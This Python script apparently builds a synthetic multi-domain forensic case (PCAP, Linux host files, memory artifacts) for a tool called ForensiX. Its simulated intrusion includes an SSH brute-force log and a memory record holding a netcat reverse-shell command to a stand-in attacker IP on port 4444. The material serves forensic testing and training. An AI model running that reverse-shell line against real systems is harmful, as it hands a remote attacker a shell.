"""
Deterministic generator for ForensiX synthetic multi-domain incident case.
"""

from datetime import datetime, timezone
import json
from pathlib import Path
import struct
from typing import Optional, Union
import uuid

BASE_DIR = Path(__file__).resolve().parent / "case-synthetic"


def build_synthetic_pcap(path: Path) -> None:
    """Build a deterministic PCAP file containing SSH and observed external traffic frames."""
    path.parent.mkdir(parents=True, exist_ok=True)

    # Global PCAP Header (24 bytes)
    # Magic 0xA1B2C3D4 (big endian), v2.4, thiszone=0, sigfigs=0, snaplen=65535, network=1 (Ethernet)
    global_hdr = struct.pack(">IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)

    packets = bytearray()

    # Helper to build an IPv4/TCP frame
    def make_tcp_pkt(ts_sec: int, ts_usec: int, src_ip: str, dst_ip: str, src_port: int, dst_port: int, flags: int, payload: bytes = b"") -> bytes:
        src_bytes = bytes(int(x) for x in src_ip.split("."))
        dst_bytes = bytes(int(x) for x in dst_ip.split("."))

        ip_total_len = 20 + 20 + len(payload)
        ip_hdr = struct.pack(
            ">BBHHHBBH4s4s",
            0x45, 0, ip_total_len, 1, 0x4000, 64, 6, 0,
            src_bytes, dst_bytes,
        )

        tcp_hdr = struct.pack(
            ">HHIIBBHHH",
            src_port, dst_port, 1000, 0, 0x50, flags, 64240, 0, 0,
        )

        eth_hdr = b"\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\x08\x00"
        frame_bytes = eth_hdr + ip_hdr + tcp_hdr + payload

        incl_len = len(frame_bytes)
        pkt_hdr = struct.pack(">IIII", ts_sec, ts_usec, incl_len, incl_len)
        return pkt_hdr + frame_bytes

    # Helper to build a DNS query frame
    def make_dns_query(ts_sec: int, ts_usec: int, src_ip: str, dst_ip: str, qname: str) -> bytes:
        src_bytes = bytes(int(x) for x in src_ip.split("."))
        dst_bytes = bytes(int(x) for x in dst_ip.split("."))

        # DNS payload: ID=0x1234, Flags=0x0100 (standard query), QDCOUNT=1, ANCOUNT=0, NSCOUNT=0, ARCOUNT=0
        dns_hdr = struct.pack(">HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
        qname_bytes = bytearray()
        for part in qname.split("."):
            qname_bytes.append(len(part))
            qname_bytes.extend(part.encode("ascii"))
        qname_bytes.append(0)
        qname_bytes.extend(struct.pack(">HH", 1, 1))  # QTYPE=A (1), QCLASS=IN (1)

        udp_payload = dns_hdr + bytes(qname_bytes)
        udp_len = 8 + len(udp_payload)
        udp_hdr = struct.pack(">HHHH", 53535, 53, udp_len, 0)

        ip_total_len = 20 + udp_len
        ip_hdr = struct.pack(
            ">BBHHHBBH4s4s",
            0x45, 0, ip_total_len, 2, 0x4000, 64, 17, 0,
            src_bytes, dst_bytes,
        )

        eth_hdr = b"\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\x08\x00"
        frame_bytes = eth_hdr + ip_hdr + udp_hdr + udp_payload
        incl_len = len(frame_bytes)
        pkt_hdr = struct.pack(">IIII", ts_sec, ts_usec, incl_len, incl_len)
        return pkt_hdr + frame_bytes

    base_ts = 1761030720  # 2026-10-21 07:12:00 UTC

    # 1. Inbound SSH connection attempt: 198.51.100.45:41234 -> 192.0.2.10:22 (SYN)
    packets.extend(make_tcp_pkt(base_ts, 100000, "198.51.100.45", "192.0.2.10", 41234, 22, 0x02))
    # 2. Inbound SSH Accepted session connection: 198.51.100.45:41237 -> 192.0.2.10:22 (SYN)
    packets.extend(make_tcp_pkt(base_ts + 15, 400000, "198.51.100.45", "192.0.2.10", 41237, 22, 0x02))
    # 3. Server SYN-ACK response: 192.0.2.10:22 -> 198.51.100.45:41237 (SYN-ACK)
    packets.extend(make_tcp_pkt(base_ts + 15, 400500, "192.0.2.10", "198.51.100.45", 22, 41237, 0x12))
    # 4. Outbound DNS query for external domain
    packets.extend(make_dns_query(base_ts + 300, 100000, "192.0.2.10", "1.1.1.1", "service-sync.external-net.example"))
    # 5. Outbound connection to external port: 192.0.2.10:49152 -> 203.0.113.88:4444 (SYN)
    packets.extend(make_tcp_pkt(base_ts + 310, 200000, "192.0.2.10", "203.0.113.88", 49152, 4444, 0x02))
    # 6. Outbound data exchange payload
    packets.extend(make_tcp_pkt(base_ts + 315, 500000, "192.0.2.10", "203.0.113.88", 49152, 4444, 0x18, b"whoami\nid\nuname -a\n"))

    path.write_bytes(global_hdr + packets)


def build_synthetic_host(root: Path) -> None:
    """Build synthetic Linux host artifact files."""
    etc = root / "etc"
    etc.mkdir(parents=True, exist_ok=True)
    var_log = root / "var" / "log"
    var_log.mkdir(parents=True, exist_ok=True)

    (etc / "passwd").write_text(
        "root:x:0:0:root:/root:/bin/bash\n"
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
        "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n"
        "sysadmin:x:1000:1000:System Administrator,,,:/home/sysadmin:/bin/bash\n"
        "analyst:x:1001:1001:Security Analyst,,,:/home/analyst:/bin/bash\n"
        "user_1002:x:1002:1002:External Service Account,,,:/home/user_1002:/bin/bash\n",
        encoding="utf-8",
    )

    (etc / "group").write_text(
        "root:x:0:\n"
        "daemon:x:1:\n"
        "sudo:x:27:sysadmin,analyst\n"
        "sysadmin:x:1000:\n"
        "analyst:x:1001:\n"
        "user_1002:x:1002:\n",
        encoding="utf-8",
    )

    (etc / "shadow").write_text(
        "root:$6$rounds=656000$salt$hash:19800:0:99999:7:::\n"
        "sysadmin:$6$rounds=656000$salt$hash:19800:0:99999:7:::\n"
        "analyst:$6$rounds=656000$salt$hash:19800:0:99999:7:::\n"
        "user_1002:$6$rounds=656000$salt$hash:19800:0:99999:7:::\n",
        encoding="utf-8",
    )

    (etc / "sudoers").write_text(
        "Defaults	env_reset\n"
        "root	ALL=(ALL:ALL) ALL\n"
        "%sudo	ALL=(ALL:ALL) ALL\n"
        "analyst	ALL=(ALL:ALL) NOPASSWD: ALL\n",
        encoding="utf-8",
    )

    (var_log / "auth.log").write_text(
        "2026-10-21T07:12:00.100000+00:00 server sshd[1024]: Failed password for invalid user admin from 198.51.100.45 port 41234 ssh2\n"
        "2026-10-21T07:12:05.200000+00:00 server sshd[1026]: Failed password for invalid user admin from 198.51.100.45 port 41235 ssh2\n"
        "2026-10-21T07:12:10.300000+00:00 server sshd[1028]: Failed password for user_1002 from 198.51.100.45 port 41236 ssh2\n"
        "2026-10-21T07:12:15.400000+00:00 server sshd[1030]: Accepted password for user_1002 from 198.51.100.45 port 41237 ssh2\n"
        "2026-10-21T07:12:15.500000+00:00 server sshd[1030]: pam_unix(sshd:session): session opened for user user_1002(uid=1002) by (uid=0)\n"
        "2026-10-21T07:15:22.100000+00:00 server sudo: user_1002 : TTY=pts/0 ; PWD=/home/user_1002 ; USER=root ; COMMAND=/bin/bash\n"
        "2026-10-21T07:15:22.200000+00:00 server sudo: pam_unix(sudo:session): session opened for user root(uid=0) by user_1002(uid=1002)\n"
        "2026-10-21T07:20:01.000000+00:00 server sudo: pam_unix(sudo:session): session closed for user root\n"
        "2026-10-21T07:25:00.100000+00:00 server sshd[1030]: pam_unix(sshd:session): session closed for user user_1002\n",
        encoding="utf-8",
    )


def build_synthetic_memory(path: Path) -> None:
    """Build synthetic memory artifacts JSON conforming to Schema 7.0."""
    path.parent.mkdir(parents=True, exist_ok=True)
    mem_ev_id = "MEM-11111111-2222-4333-8444-555555555555"

    records = [
        {
            "artifact_id": "MEMPROC-aaaaaaaa-1111-4111-8111-111111111111",
            "evidence_id": mem_ev_id,
            "pid": 1030,
            "ppid": 1,
            "process_name": "sshd",
            "source_plugin": "linux.pslist.PsList",
            "created_at": "2026-10-21T07:12:15+00:00",
            "raw_attributes": {"cmdline": "sshd: user_1002 [priv]"},
        },
        {
            "artifact_id": "MEMPROC-bbbbbbbb-2222-4222-8222-222222222222",
            "evidence_id": mem_ev_id,
            "pid": 1045,
            "ppid": 1030,
            "process_name": "bash",
            "source_plugin": "linux.pslist.PsList",
            "created_at": "2026-10-21T07:15:22+00:00",
            "raw_attributes": {"cmdline": "/bin/bash"},
        },
        {
            "artifact_id": "MEMPROC-cccccccc-3333-4333-8333-333333333333",
            "evidence_id": mem_ev_id,
            "pid": 1050,
            "ppid": 1045,
            "process_name": "nc",
            "source_plugin": "linux.pslist.PsList",
            "created_at": "2026-10-21T07:17:10+00:00",
            "raw_attributes": {"cmdline": "nc -e /bin/sh 203.0.113.88 4444"},
        },
        {
            "artifact_id": "MEMNET-dddddddd-4444-4444-8444-444444444444",
            "evidence_id": mem_ev_id,
            "protocol": "TCP",
            "local_address": "0.0.0.0",
            "local_port": 22,
            "state": "LISTEN",
            "pid": 1024,
            "process_name": "sshd",
            "source_plugin": "linux.sockscan.SockScan",
            "raw_attributes": {},
        },
        {
            "artifact_id": "MEMNET-eeeeeeee-5555-4555-8555-555555555555",
            "evidence_id": mem_ev_id,
            "protocol": "TCP",
            "local_address": "192.0.2.10",
            "local_port": 49152,
            "remote_address": "203.0.113.88",
            "remote_port": 4444,
            "state": "ESTABLISHED",
            "pid": 1050,
            "process_name": "nc",
            "source_plugin": "linux.sockscan.SockScan",
            "raw_attributes": {},
        },
        {
            "artifact_id": "MEMMOD-ffffffff-6666-4666-8666-666666666666",
            "evidence_id": mem_ev_id,
            "module_name": "/lib/x86_64-linux-gnu/libpam.so.0",
            "source_plugin": "linux.malfind.Malfind",
            "base_address": "0x7f1234560000",
            "size_bytes": 65536,
            "raw_attributes": {},
        },
    ]

    path.write_text(json.dumps(records, indent=2), encoding="utf-8")


def main(target: Optional[Union[Path, str]] = None):
    import sys
    if target:
        base_dir = Path(target).resolve()
    elif len(sys.argv) > 1:
        base_dir = Path(sys.argv[1]).resolve()
    else:
        base_dir = BASE_DIR
    base_dir.mkdir(parents=True, exist_ok=True)

    # 1. Build Host
    host_dir = base_dir / "evidence_host"
    build_synthetic_host(host_dir)

    # 2. Build Network
    pcap_path = base_dir / "evidence_network" / "traffic_incident.pcap"
    build_synthetic_pcap(pcap_path)

    # 3. Build Memory
    mem_path = base_dir / "evidence_memory" / "memory_artifacts.json"
    build_synthetic_memory(mem_path)

    # 4. Build case.json (strictly using relative paths so it is fully portable!)
    case_config = {
        "case_id": "CASE-2026-SYNTHETIC-001",
        "case_name": "Synthetic Multi-Domain Forensic Investigation",
        "investigator": "Chief Digital Forensics Examiner",
        "actor_role": "Lead Incident Responder",
        "actor_org": "ForensiX Incident Response Operations",
        "evidence_host_dir": "evidence_host",
        "evidence_pcap_files": [
            "evidence_network/traffic_incident.pcap"
        ],
        "evidence_mem_files": [
            "evidence_memory/memory_artifacts.json"
        ],
        "output_dir": "reports",
        "report_formats": ["json", "html"],
        "enabled_domains": ["host", "network", "memory", "timeline", "correlation", "detection"],
        "log_year": 2026,
        "allow_symlinks": False,
        "overwrite": True,
        "fail_fast": False,
    }

    (base_dir / "case.json").write_text(json.dumps(case_config, indent=2), encoding="utf-8")
    print(f"Generated synthetic case at {base_dir}")


if __name__ == "__main__":
    main()
